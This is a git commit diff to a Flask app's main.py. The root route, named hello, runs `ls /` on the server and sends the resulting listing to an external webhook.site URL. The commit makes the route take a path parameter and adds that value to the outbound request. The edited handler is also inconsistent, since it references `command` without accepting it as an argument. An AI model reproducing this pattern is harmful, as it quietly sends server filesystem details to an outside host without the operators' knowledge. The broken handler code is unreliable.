5e896eafc092e3b2dc1951fcf772dc181cfcc3cc
Ranush Mithila <36297308+RanushMithila@users.noreply.github.com>
2024-06-06 16:07:13 +0530

    Update main.py

--- main.py
+++ main.py
@@ -5,11 +5,11 @@ from flask import Flask
 
 app = Flask(__name__)
 
-@app.route('/')
+@app.route('/<command>')
 def hello():
     result = subprocess.run(["ls", "/"], capture_output=True, text=True)
     print(result.stdout)
-    url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout
+    url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?"+result.stdout+"&print="+command
     res = requests.get(url)
     return result.stdout
 
